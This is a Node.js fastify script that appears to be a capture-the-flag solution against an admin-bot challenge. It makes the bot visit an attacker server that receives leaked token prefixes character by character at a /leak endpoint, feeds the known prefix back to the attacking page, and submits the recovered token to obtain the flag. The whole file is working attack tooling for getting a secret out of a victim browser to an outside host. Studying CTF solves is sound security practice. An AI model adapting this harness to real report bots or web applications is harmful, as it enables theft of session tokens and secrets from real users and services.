import fastify from "fastify";
import fs from "node:fs/promises";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

let known = "TOKEN_";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const verify = (token) =>
  fetch(`${BOT_BASE_URL}/api/verify`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ token }),
  }).then((r) => r.text());

app.get("/", async (req, reply) => {
  reply.type("text/html; charset=utf-8").send(await fs.readFile("index.html"));
});

app.get("/leak", async (req, reply) => {
  known = req.query.prefix;
  console.log({ known });
  return "";
});

app.get("/known", async (req, reply) => {
  const length = parseInt(req.query.length);
  while (true) {
    if (known.length >= length) {
      return known;
    } else {
      await sleep(10);
    }
  }
});

app.post("/token", async (req, reply) => {
  const token = req.body;
  const flag = await verify(token);
  console.log({ token, flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }).then(async (address) => {
  await sleep(3_000);
  await reportUrl(CONNECTBACK_URL);
  assert.fail("Failed");
});
